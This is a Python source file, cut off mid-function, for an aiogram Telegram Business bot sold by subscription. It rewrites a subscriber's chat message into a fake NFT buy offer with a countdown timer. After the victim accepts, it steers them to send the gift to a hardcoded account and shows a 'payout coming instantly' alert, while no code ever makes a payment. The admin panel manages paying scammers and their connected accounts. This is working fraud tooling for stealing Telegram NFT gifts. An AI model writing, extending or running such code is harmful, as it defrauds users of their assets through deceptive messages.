"""
OffersNftGiftsRobot — Telegram Business NFT Offer Bot with Subscription System (aiogram 3.x)

Features:
  - Integration with Telegram Business Chatbot API (Bot API 7.2+)
  - Subscription-gated access:
      * Admin grants subscription via: /give <user_id> <duration> (e.g. /give 123456789 2 дня)
      * If user has no active subscription: message becomes "(подписка окончена.)"
      * Admin revokes subscription via: /take <user_id>
  - Custom Telegram Premium Emojis:
      * White Star: <tg-emoji emoji-id="5960672896060756972">⭐</tg-emoji> (TgAndroidIcons)
      * Gram Coin: <tg-emoji emoji-id="5377620962390857342">🪙</tg-emoji> (FinanceEmoji)
  - Supports both STARS and GRAM offers:
      * /offers <nft_url> <amount> <hours> [recipient] (Stars)
      * /offers <nft_url> <amount> <hours> gram [recipient] (Gram)
      * /goffers or /gramoffers <nft_url> <amount> <hours> [recipient] (Gram)
  - Exact 2-step post-acceptance instruction with large media preview on top
  - Interactive Admin Panel (/offer)
"""

import asyncio
import logging
import re
import time
from datetime import datetime, timezone

from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramRetryAfter
from aiogram.types import (
    BusinessConnection,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)

import config
import subs

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

active_timers: dict[str, bool] = {}
admin_states: dict[int, dict] = {}


def ts() -> str:
    return datetime.now(tz=timezone.utc).strftime("%H:%M:%S")


def fmt_remaining(seconds: float) -> str:
    total = max(0, int(seconds))
    h, rem = divmod(total, 3600)
    m, s = divmod(rem, 60)
    return f"{h}:{m:02d}:{s:02d}"


def format_nft_name(nft_url: str) -> str:
    slug = nft_url.rstrip("/").split("/")[-1]
    m = re.match(r"^(.*?)-(\d+)$", slug)
    if m:
        return f"{m.group(1)} #{m.group(2)}"
    return slug


def build_text_html(amount: int, remaining_sec: float, nft_url: str, is_gram: bool = False) -> str:
    name_num = format_nft_name(nft_url)
    countdown = fmt_remaining(remaining_sec)
    if is_gram:
        currency_str = f"{config.GRAM_EMOJI_HTML} GRAM"
    else:
        currency_str = f"{config.STAR_EMOJI_HTML}"

    return (
        f'<b>Пользователь готов выкупить <a href="{nft_url}">{name_num}</a> за {amount} {currency_str}</b>\n'
        f"<b>Осталось: {countdown}</b>"
    )


def make_initial_keyboard(is_gram: bool = False) -> InlineKeyboardMarkup:
    g_flag = "1" if is_gram else "0"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="Принять", callback_data=f"accept:{g_flag}"),
                InlineKeyboardButton(text="Отклонить", callback_data="decline_offer"),
            ]
        ]
    )


def make_transfer_keyboard(transfer_url: str = None) -> InlineKeyboardMarkup:
    url = transfer_url or config.TRANSFER_URL
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="Передать подарок", url=url),
            ],
            [
                InlineKeyboardButton(text="Подтвердить передачу", callback_data="confirm_transfer"),
            ]
        ]
    )


async def update_timer(
    business_connection_id: str,
    chat_id: int,
    message_id: int,
    nft_url: str,
    amount: int,
    end_time: float,
    is_gram: bool = False,
) -> None:
    timer_key = f"{chat_id}_{message_id}"
    active_timers[timer_key] = True

    preview_opts = LinkPreviewOptions(
        is_disabled=False,
        prefer_large_media=True,
        show_above_text=True,
    )

    curr_label = "GRAM" if is_gram else "★"

    try:
        while active_timers.get(timer_key, False):
            remaining = end_time - time.time()

            if remaining <= 0:
                expired_text = f"<b>❌ Оффер на {amount} {curr_label} истёк.</b>"
                try:
                    await bot.edit_message_text(
                        text=expired_text,
                        business_connection_id=business_connection_id,
                        chat_id=chat_id,
                        message_id=message_id,
                        parse_mode=ParseMode.HTML,
                        link_preview_options=LinkPreviewOptions(is_disabled=True),
                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[]),
                    )
                    logger.info(f"[{ts()}] оффер истек для msg_id={message_id}")
                except Exception as e:
                    logger.error(f"[{ts()}] ошибка завершения таймера: {e}")
                return

            text = build_text_html(amount, remaining, nft_url, is_gram=is_gram)
            try:
                await bot.edit_message_text(
                    text=text,
                    business_connection_id=business_connection_id,
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode=ParseMode.HTML,
                    link_preview_options=preview_opts,
                    reply_markup=make_initial_keyboard(is_gram=is_gram),
                )
            except TelegramRetryAfter as e:
                logger.warning(f"[{ts()}] Rate-limit: ожидание {e.retry_after}с")
                await asyncio.sleep(e.retry_after)
                continue
            except Exception as e:
                err = str(e)
                if "message is not modified" not in err.lower():
                    logger.warning(f"[{ts()}] ошибка обновления таймера: {e}")

            await asyncio.sleep(config.EDIT_INTERVAL_SEC)
    finally:
        active_timers.pop(timer_key, None)


# ---------------------------------------------------------------------------
# Business Connection Tracker
# ---------------------------------------------------------------------------

@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    status = "CONNECTED" if connection.is_enabled else "DISCONNECTED"
    user = connection.user
    can_reply = getattr(connection, "can_reply", None)

    try:
        me = await bot.get_me()
        bot_tag = me.username
    except Exception:
        bot_tag = None

    subs.save_connection(
        conn_id=connection.id,
        user_id=user.id,
        username=user.username,
        full_name=user.full_name,
        is_enabled=connection.is_enabled,
        can_reply=can_reply,
        bot_username=bot_tag,
    )

    logger.info(
        f"[{ts()}] Бизнес-аккаунт {status}: {user.full_name} (@{user.username}, id={user.id}) | бот=@{bot_tag}"
    )


# ---------------------------------------------------------------------------
# Business Message Handler (/offers and /goffers)
# ---------------------------------------------------------------------------

OFFERS_RE = re.compile(
    r"^/(offers?|goffers?|gramoffers?)\s+"
    r"(https?://t\.me/nft/[\w-]+|t\.me/nft/[\w-]+)\s+"
    r"(\d+)\s+"
    r"(\d+(?:\.\d+)?)"
    r"(?:\s+(.*))?$",
    re.IGNORECASE,
)


@dp.business_message()
async def on_business_message(message: Message):
    conn_id = message.business_connection_id

    # Auto-resolve connection owner
    if conn_id:
        try:
            conn = await bot.get_business_connection(conn_id)
            me = await bot.get_me()
            subs.save_connection(
                conn_id=conn.id,
                user_id=conn.user.id,
                username=conn.user.username,
                full_name=conn.user.full_name,
                is_enabled=conn.is_enabled,
                can_reply=getattr(conn, "can_reply", True),
                bot_username=me.username,
            )
        except Exception:
            pass

    text = (message.text or "").strip()
    m = OFFERS_RE.match(text)
    if not m:
        return

    # Ignore messages sent to self / loopbacks
    if message.from_user and message.chat.id == message.from_user.id:
        return

    chat_id = message.chat.id
    sender = message.from_user
    sender_id = sender.id if sender else None
    sender_username = sender.username if sender else None

    # SUBSCRIPTION CHECK
    if not subs.is_subscription_active(user_id=sender_id, conn_id=conn_id):
        logger.info(
            f"[{ts()}] ⛔ Попытка создания оффера БЕЗ подписки: user={sender_username} (id={sender_id}) conn={conn_id}"
        )
        banned_text = "подписка окончена."
        try:
            await bot.edit_message_text(
                business_connection_id=conn_id,
                chat_id=chat_id,
                message_id=message.message_id,
                text=banned_text,
                link_preview_options=LinkPreviewOptions(is_disabled=True),
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[]),
            )
        except Exception:
            try:
                await bot.delete_message(chat_id=chat_id, message_id=message.message_id)
            except Exception:
                pass
            try:
                await bot.send_message(
                    business_connection_id=conn_id,
                    chat_id=chat_id,
                    text=banned_text,
                )
            except Exception:
                pass
        return

    cmd_type = m.group(1).lower()
    nft_url = m.group(2)
    if not nft_url.startswith("http"):
        nft_url = "https://" + nft_url

    amount = int(m.group(3))
    hours = float(m.group(4))

    extra_tokens = (m.group(5) or "").lower()

    # Determine currency (Gram or Stars)
    # Recipient is STRICTLY locked to config.TARGET_RECIPIENT_USERNAME (@modellernft / 7234362765)
    is_gram = False
    if "gram" in cmd_type or cmd_type == "goffers":
        is_gram = True
    elif any(kw in extra_tokens for kw in ["gram", "g", "грамм"]):
        is_gram = True

    end_time = time.time() + hours * 3600

    logger.info(
        f"[{ts()}] Оффер принят к созданию: nft={nft_url} amount={amount} is_gram={is_gram} hours={hours} locked_recipient=@{config.TARGET_RECIPIENT_USERNAME}"
    )

    initial_text = build_text_html(amount, hours * 3600, nft_url, is_gram=is_gram)
    preview_opts = LinkPreviewOptions(
        is_disabled=False,
        prefer_large_media=True,
        show_above_text=True,
    )

    target_msg_id = None
    try:
        await bot.edit_message_text(
            business_connection_id=conn_id,
            chat_id=chat_id,
            message_id=message.message_id,
            text=initial_text,
            parse_mode=ParseMode.HTML,
            link_preview_options=preview_opts,
            reply_markup=make_initial_keyboard(is_gram=is_gram),
        )
        target_msg_id = message.message_id
    except Exception as e:
        logger.warning(f"[{ts()}] редактирование на месте не удалось ({e}), отправляю новое сообщение")
        try:
            await bot.delete_message(chat_id=chat_id, message_id=message.message_id)
        except Exception:
            pass

        sent = await bot.send_message(
            business_connection_id=conn_id,
            chat_id=chat_id,
            text=initial_text,
            parse_mode=ParseMode.HTML,
            link_preview_options=preview_opts,
            reply_markup=make_initial_keyboard(is_gram=is_gram),
        )
        target_msg_id = sent.message_id

    if target_msg_id:
        asyncio.create_task(
            update_timer(conn_id, chat_id, target_msg_id, nft_url, amount, end_time, is_gram=is_gram),
            name=f"timer_{target_msg_id}",
        )


# ---------------------------------------------------------------------------
# Callback Query Handlers (Принять / Отклонить / Подтвердить передачу)
# ---------------------------------------------------------------------------

@dp.callback_query(F.data.startswith("accept:"))
async def on_accept(callback: CallbackQuery):
    msg = callback.message
    if not msg:
        await callback.answer()
        return

    # Data: "accept:<is_gram>"
    parts = callback.data.split(":")
    is_gram = (parts[1] == "1") if len(parts) > 1 else False

    # СТРОГО ФИКСИРОВАННЫЙ ПОЛУЧАТЕЛЬ: @modellernft (ID: 7234362765)
    recipient = config.TARGET_RECIPIENT_USERNAME
    recipient_id = config.TARGET_RECIPIENT_ID

    timer_key = f"{msg.chat.id}_{msg.message_id}"
    active_timers.pop(timer_key, None)

    conn_id = getattr(msg, "business_connection_id", None)

    # Extract amount
    amount = "5000"
    if msg.text:
        m_amt = re.search(r"за\s*(\d+)", msg.text)
        if m_amt:
            amount = m_amt.group(1)

    # Extract NFT link and name
    nft_url = None
    name_num = "подарок"
    slug = None

    if getattr(msg, "entities", None):
        for ent in msg.entities:
            if getattr(ent, "url", None) and "t.me/nft/" in ent.url:
                nft_url = ent.url
                slug = nft_url.rstrip("/").split("/")[-1]
                name_num = format_nft_name(nft_url)
                break

    if not nft_url and msg.text:
        m_url = re.search(r"https?://t\.me/nft/([\w-]+)", msg.text)
        if m_url:
            nft_url = m_url.group(0)
            slug = m_url.group(1)
            name_num = format_nft_name(nft_url)

    if not nft_url:
        nft_url = "https://t.me/nft"

    if slug:
        transfer_url = (
            f"tg://send_gift?slug={slug}&user={recipient}&to={recipient}"
            f"&recipient={recipient}&username={recipient}&peer={recipient}"
            f"&user_id={recipient_id}&id={recipient_id}&peer_id={recipient_id}"
        )
    else:
        transfer_url = (
            f"tg://send_gift?user={recipient}&to={recipient}"
            f"&recipient={recipient}&username={recipient}&peer={recipient}"
            f"&user_id={recipient_id}&id={recipient_id}&peer_id={recipient_id}"
        )

    if is_gram:
        curr_html = f"{config.GRAM_EMOJI_HTML} GRAM"
    else:
        curr_html = f"{config.STAR_EMOJI_HTML}"

    accepted_text = (
        f'1. Отправьте <a href="{nft_url}">{name_num}</a> через кнопку «Передать подарок».\n'
        f"2. Нажмите кнопку «Подтвердить передачу».\n\n"
        f"Выплата <b>{amount} {curr_html}</b> поступит моментально после получения подарка."
    )

    preview_opts = LinkPreviewOptions(
        url=nft_url,
        is_disabled=False,
        prefer_large_media=True,
        show_above_text=True,
    )

    try:
        await bot.edit_message_text(
            text=accepted_text,
            business_connection_id=conn_id,
            chat_id=msg.chat.id,
            message_id=msg.message_id,
            parse_mode=ParseMode.HTML,
            link_preview_options=preview_opts,
            reply_markup=make_transfer_keyboard(transfer_url),
        )
        await callback.answer("Предложение принято!")
        logger.info(f"[{ts()}] оффер принят — инструкция выставлена для recipient={recipient}")
    except Exception as e:
        logger.error(f"[{ts()}] ошибка редактирования на инструкцию: {e}")
        await callback.answer()


@dp.callback_query(F.data == "confirm_transfer")
async def on_confirm_transfer(callback: CallbackQuery):
    await callback.answer(
        "⏳ Проверяем передачу подарка...\nВыплата поступит моментально после подтверждения транзакции в сети.",
        show_alert=True
    )


@dp.callback_query(F.data == "decline_offer")
async def on_decline(callback: CallbackQuery):
    msg = callback.message
    if not msg:
        await callback.answer()
        return

    timer_key = f"{msg.chat.id}_{msg.message_id}"
    active_timers.pop(timer_key, None)

    conn_id = getattr(msg, "business_connection_id", None)

    try:
        await bot.edit_message_text(
            text="<b>Оффер отменён.</b>",
            business_connection_id=conn_id,
            chat_id=msg.chat.id,
            message_id=msg.message_id,
            parse_mode=ParseMode.HTML,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[]),
        )
        await callback.answer("Оффер отменён.")
    except Exception as e:
        logger.error(f"[{ts()}] ошибка отмены: {e}")
        await callback.answer()


# ---------------------------------------------------------------------------
# Admin Panel & Subscription Commands (/give, /take, /subs, /offer)
# ---------------------------------------------------------------------------

@dp.message(F.text.startswith("/give"))
async def cmd_give(message: Message):
    sender = message.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await message.answer(f"❌ <b>Доступ запрещён.</b> Ваш ID: <code>{sender.id}</code>", parse_mode=ParseMode.HTML)
        return

    # /give <id> <duration>
    # e.g.: /give 123456789 2 дня
    parts = message.text.strip().split(maxsplit=2)
    if len(parts) < 3:
        await message.answer(
            "ℹ️ <b>Использование:</b> <code>/give &lt;ID пользователя&gt; &lt;срок&gt;</code>\n\n"
            "<b>Примеры:</b>\n"
            "• <code>/give 123456789 2 дня</code>\n"
            "• <code>/give 123456789 7 дней</code>\n"
            "• <code>/give 123456789 1 месяц</code>\n"
            "• <code>/give 123456789 24 часа</code>\n"
            "• <code>/give 123456789 1 год</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    raw_target = parts[1].strip()
    raw_dur = parts[2].strip()

    if not raw_target.isdigit():
        await message.answer("❌ ID пользователя должен состоять только из цифр.", parse_mode=ParseMode.HTML)
        return

    target_id = int(raw_target)
    ok, readable_str, new_expiry = subs.grant_subscription(target_id, raw_dur, granted_by=sender.id)

    if not ok:
        await message.answer(f"❌ Ошибка: {readable_str}", parse_mode=ParseMode.HTML)
        return

    exp_dt = datetime.fromtimestamp(new_expiry, tz=timezone.utc).strftime("%d.%m.%Y %H:%M UTC")

    await message.answer(
        f"✅ <b>Подписка успешно выдана!</b>\n\n"
        f"• <b>Пользователь:</b> <code>{target_id}</code>\n"
        f"• <b>Срок:</b> {readable_str}\n"
        f"• <b>Действует до:</b> <code>{exp_dt}</code>",
        parse_mode=ParseMode.HTML,
    )

    # Try notifying the user
    try:
        await bot.send_message(
            chat_id=target_id,
            text=(
                f"🎉 <b>Вам выдана подписка на Telegram Business бота на {readable_str}!</b>\n\n"
                f"• Действует до: <code>{exp_dt}</code>\n\n"
                f"Теперь вы можете делать офферы через свой бизнес-аккаунт:\n"
                f"<code>/offers &lt;ссылка_на_nft&gt; &lt;сумма&gt; &lt;время&gt;</code>"
            ),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass


@dp.message(F.text.startswith("/take"))
async def cmd_take(message: Message):
    sender = message.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await message.answer(f"❌ <b>Доступ запрещён.</b>", parse_mode=ParseMode.HTML)
        return

    parts = message.text.strip().split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip().isdigit():
        await message.answer("ℹ️ <b>Использование:</b> <code>/take &lt;ID пользователя&gt;</code>", parse_mode=ParseMode.HTML)
        return

    target_id = int(parts[1].strip())
    if subs.revoke_subscription(target_id):
        await message.answer(f"❌ Подписка у пользователя <code>{target_id}</code> <b>аннулирована</b>.", parse_mode=ParseMode.HTML)
    else:
        await message.answer(f"ℹ️ У пользователя <code>{target_id}</code> не найдено активной подписки.", parse_mode=ParseMode.HTML)


@dp.message(F.text.in_(["/subs", "/subscriptions"]))
async def cmd_subs_list(message: Message):
    sender = message.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await message.answer(f"❌ <b>Доступ запрещён.</b>", parse_mode=ParseMode.HTML)
        return

    all_subs = subs.get_subscriptions()
    now = int(time.time())

    active_list = []
    for uid, item in all_subs.items():
        exp = item.get("expires_at", 0)
        if exp > now:
            active_list.append((uid, exp, item.get("duration_str", "")))

    if not active_list:
        await message.answer("📋 <b>Список активных подписок пуст.</b>", parse_mode=ParseMode.HTML)
        return

    text = f"📋 <b>Активные подписки ({len(active_list)}):</b>\n\n"
    for uid, exp, d_str in active_list:
        exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc).strftime("%d.%m.%Y %H:%M")
        rem = exp - now
        text += f"• <code>{uid}</code> (срок: {d_str})\n"
        text += f"   └ До: <code>{exp_dt} UTC</code> (осталось {fmt_remaining(rem)})\n"

    await message.answer(text, parse_mode=ParseMode.HTML)


# ---------------------------------------------------------------------------
# Admin UI Helpers (/offer control panel)
# ---------------------------------------------------------------------------

def make_admin_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="👥 Подключенные бизнес-аккаунты", callback_data="adm:conns")
            ],
            [
                InlineKeyboardButton(text="🎟️ Выдать подписку", callback_data="adm:give_prompt"),
                InlineKeyboardButton(text="📋 Активные подписки", callback_data="adm:subs"),
            ],
            [
                InlineKeyboardButton(text="👑 Администраторы", callback_data="adm:admins"),
                InlineKeyboardButton(text="🔄 Обновить", callback_data="adm:refresh"),
            ]
        ]
    )


def build_admin_menu_text() -> str:
    conns = subs.get_connected_users()
    active_conns = [c for c in conns if c.get("is_enabled", False)]

    all_subs = subs.get_subscriptions()
    now = int(time.time())
    active_subs_count = sum(1 for item in all_subs.values() if item.get("expires_at", 0) > now)

    return (
        "👑 <b>Панель управления OffersNftGiftsRobot</b>\n\n"
        f"• 👥 <b>Подключенных бизнес-аккаунтов:</b> <code>{len(active_conns)}</code>\n"
        f"• 🎟️ <b>Активных подписок:</b> <code>{active_subs_count}</code>\n\n"
        f"• 💎 <b>Кастомные эмодзи:</b> {config.STAR_EMOJI_HTML} Звезда | {config.GRAM_EMOJI_HTML} Gram\n\n"
        "<i>Выберите необходимое действие в меню ниже:</i>"
    )


@dp.message(F.text.in_(["/offer", "/offers", "/menu", "/admin"]))
async def cmd_admin_menu(message: Message):
    sender = message.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await message.answer(
            f"❌ <b>Доступ запрещён.</b>\nВаш ID: <code>{sender.id}</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    admin_states.pop(sender.id, None)
    await message.answer(
        build_admin_menu_text(),
        parse_mode=ParseMode.HTML,
        reply_markup=make_admin_menu_keyboard(),
    )


@dp.callback_query(F.data.in_(["adm:main", "adm:refresh"]))
async def cb_admin_main(callback: CallbackQuery):
    sender = callback.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return

    admin_states.pop(sender.id, None)
    try:
        await callback.message.edit_text(
            build_admin_menu_text(),
            parse_mode=ParseMode.HTML,
            reply_markup=make_admin_menu_keyboard(),
        )
    except Exception:
        pass
    await callback.answer("Обновлено")


@dp.callback_query(F.data == "adm:conns")
async def cb_admin_conns(callback: CallbackQuery):
    sender = callback.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return

    conns = subs.get_connected_users()
    if not conns:
        text = "👥 <b>Список подключенных бизнес-аккаунтов пуст.</b>"
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Главное меню", callback_data="adm:main")]
        ])
        await callback.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        await callback.answer()
        return

    now = int(time.time())
    text = f"👥 <b>Подключенные бизнес-аккаунты ({len(conns)}):</b>\n\n"
    buttons = []
    for c in conns:
        uid = c.get("user_id")
        uname = c.get("username")
        fname = c.get("full_name") or "Без имени"
        is_en = c.get("is_enabled", True)
        status_icon = "🟢" if is_en else "🔴"
        status_text = "Активен" if is_en else "Отключен"

        # Check sub
        sub_info = subs.get_user_sub_info(uid)
        is_sub = sub_info.get("is_active", False) if sub_info else False
        sub_label = " [🎟️ Подписка: ДА]" if is_sub else " [❌ БЕЗ подписки]"

        u_str = f"@{uname}" if uname else "нет юзера"
        text += f"{status_icon} <b>{fname}</b> ({u_str})\n"
        text += f"   └ ID: <code>{uid}</code> | {status_text}{sub_label}\n"

        target_display = f"@{uname}" if uname else str(uid)
        if not is_sub:
            buttons.append([InlineKeyboardButton(text=f"🎟️ Выдать подписку {target_display}", callback_data=f"prompt_give:{uid}")])
        else:
            buttons.append([InlineKeyboardButton(text=f"❌ Аннулировать {target_display}", callback_data=f"take_sub:{uid}")])

    buttons.append([InlineKeyboardButton(text="◀️ Главное меню", callback_data="adm:main")])
    kb = InlineKeyboardMarkup(inline_keyboard=buttons)

    await callback.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    await callback.answer()


@dp.callback_query(F.data == "adm:give_prompt")
async def cb_give_prompt(callback: CallbackQuery):
    sender = callback.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return

    admin_states[sender.id] = {"state": "waiting_for_give"}

    text = (
        "🎟️ <b>Выдача подписки</b>\n\n"
        "Отправьте сообщением в этот чат <b>ID пользователя</b> и <b>срок</b>:\n\n"
        "<b>Примеры:</b>\n"
        "• <code>123456789 2 дня</code>\n"
        "• <code>123456789 7 дней</code>\n"
        "• <code>123456789 1 месяц</code>\n"
        "• <code>123456789 24 часа</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Отмена", callback_data="adm:main")]
    ])
    await callback.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    await callback.answer()


@dp.callback_query(F.data.startswith("prompt_give:"))
async def cb_prompt_give_specific(callback: CallbackQuery):
    sender = callback.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return

    uid = callback.data.split(":", 1)[1]
    admin_states[sender.id] = {"state": "waiting_for_give_duration", "target_id": uid}

    text = (
        f"🎟️ <b>Выдача подписки для <code>{uid}</code></b>\n\n"
        "Отправьте сообщением срок подписки (например: <code>2 дня</code>, <code>1 месяц</code>, <code>7 дней</code>):"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Отмена", callback_data="adm:conns")]
    ])
    await callback.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    await callback.answer()


@dp.callback_query(F.data.startswith("take_sub:"))
async def cb_take_sub(callback: CallbackQuery):
    sender = callback.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return

    uid = int(callback.data.split(":", 1)[1])
    subs.revoke_subscription(uid)
    await callback.answer(f"Подписка у {uid} аннулирована!", show_alert=True)
    await cb_admin_conns(callback)


@dp.callback_query(F.data == "adm:subs")
async def cb_subs_menu(callback: CallbackQuery):
    sender = callback.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return

    all_subs = subs.get_subscriptions()
    now = int(time.time())

    active_list = []
    for uid, item in all_subs.items():
        exp = item.get("expires_at", 0)
        if exp > now:
            active_list.append((uid, exp, item.get("duration_str", "")))

    if not active_list:
        text = "📋 <b>Список активных подписок пуст.</b>"
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Главное меню", callback_data="adm:main")]
        ])
        await callback.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        await callback.answer()
        return

    text = f"📋 <b>Активные подписки ({len(active_list)}):</b>\n\n"
    buttons = []
    for uid, exp, d_str in active_list:
        exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc).strftime("%d.%m.%Y %H:%M")
        rem = exp - now
        text += f"• <code>{uid}</code> (срок: {d_str})\n"
        text += f"   └ До: <code>{exp_dt} UTC</code> (осталось {fmt_remaining(rem)})\n"
        buttons.append([InlineKeyboardButton(text=f"❌ Аннулировать {uid}", callback_data=f"take_sub:{uid}")])

    buttons.append([InlineKeyboardButton(text="◀️ Главное меню", callback_data="adm:main")])
    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
    await callback.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    await callback.answer()


@dp.callback_query(F.data == "adm:admins")
async def cb_admins_menu(callback: CallbackQuery):
    sender = callback.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return

    data = subs.get_admins_data()
    ids = data.get("user_ids", [])
    unames = data.get("usernames", [])

    text = (
        "👑 <b>Управление администраторами</b>\n\n"
        f"• <b>Главный администратор:</b> <code>{config.MASTER_ADMIN_ID}</code>\n\n"
    )

    extra_ids = [i for i in ids if i != config.MASTER_ADMIN_ID]
    if extra_ids or unames:
        text += "<b>Дополнительные администраторы:</b>\n"
        for i in extra_ids:
            text += f"• ID: <code>{i}</code>\n"
        for u in unames:
            text += f"• @{u}\n"
    else:
        text += "<i>Дополнительных администраторов нет. Доступ открыт только вам.</i>\n"

    buttons = [
        [InlineKeyboardButton(text="➕ Добавить администратора", callback_data="adm:add_admin_prompt")],
    ]
    if extra_ids or unames:
        buttons.append([InlineKeyboardButton(text="➖ Удалить администратора", callback_data="adm:del_admin_prompt")])
    buttons.append([InlineKeyboardButton(text="◀️ Главное меню", callback_data="adm:main")])

    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
    await callback.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    await callback.answer()


@dp.callback_query(F.data == "adm:add_admin_prompt")
async def cb_add_admin_prompt(callback: CallbackQuery):
    sender = callback.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return

    admin_states[sender.id] = {"state": "waiting_for_admin"}

    text = (
        "➕ <b>Добавление администратора</b>\n\n"
        "Отправьте сообщением в этот чат <b>юзернейм</b> или <b>ID</b> нового администратора:"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Отмена", callback_data="adm:admins")]
    ])
    await callback.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    await callback.answer()


@dp.callback_query(F.data == "adm:del_admin_prompt")
async def cb_del_admin_prompt(callback: CallbackQuery):
    sender = callback.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return

    data = subs.get_admins_data()
    ids = [i for i in data.get("user_ids", []) if i != config.MASTER_ADMIN_ID]
    unames = data.get("usernames", [])

    if not ids and not unames:
        await callback.message.edit_text(
            "ℹ️ <b>Нет дополнительных администраторов для удаления.</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="◀️ Назад", callback_data="adm:admins")]
            ]),
        )
        await callback.answer()
        return

    text = "➖ <b>Выберите администратора для снятия прав:</b>\n"
    buttons = []
    for uid in ids:
        buttons.append([InlineKeyboardButton(text=f"❌ Снять ID: {uid}", callback_data=f"deladm:id:{uid}")])
    for u in unames:
        buttons.append([InlineKeyboardButton(text=f"❌ Снять @{u}", callback_data=f"deladm:username:{u}")])

    buttons.append([InlineKeyboardButton(text="◀️ Назад", callback_data="adm:admins")])
    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
    await callback.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    await callback.answer()


@dp.callback_query(F.data.startswith("deladm:"))
async def cb_del_admin_confirm(callback: CallbackQuery):
    sender = callback.from_user
    if not subs.is_admin(user_id=sender.id, username=sender.username):
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return

    _, target_type, target_val = callback.data.split(":", 2)
    subs.remove_admin(target_type, target_val)
    display_target = target_val if target_type == "id" else f"@{target_val}"
    await callback.answer(f"Администратор {display_target} снят!", show_alert=True)
    await cb_admins_menu(callback)


# ---------------------------------------------------------------------------
# Direct Admin Text Handlers (FSM-like state handler)
# ---------------------------------------------------------------------------

@dp.message(F.text)
async def handle_user_text(message: Message):
    sender = message.from_user
    st_data = admin_states.get(sender.id, {})
    state = st_data.get("state")

    if state == "waiting_for_give":
        admin_states.pop(sender.id, None)
        parts = message.text.strip().split(maxsplit=1)
        if len(parts) < 2 or not parts[0].isdigit():
            await message.answer("❌ Неверный формат. Нужно: <code>ID срок</code> (например: <code>123456789 2 дня</code>)", parse_mode=ParseMode.HTML)
            return

        target_id = int(parts[0])
        dur_str = parts[1]
        ok, readable, exp = subs.grant_subscription(target_id, dur_str, granted_by=sender.id)
        if ok:
            exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc).strftime("%d.%m.%Y %H:%M UTC")
            await message.answer(f"✅ Подписка выдана пользователю <code>{target_id}</code> на {readable} (до {exp_dt})", parse_mode=ParseMode.HTML)
        else:
            await message.answer(f"❌ Ошибка: {readable}")
        return

    if state == "waiting_for_give_duration":
        target_id = int(st_data.get("target_id"))
        admin_states.pop(sender.id, None)
        dur_str = message.text.strip()
        ok, readable, exp = subs.grant_subscription(target_id, dur_str, granted_by=sender.id)
        if ok:
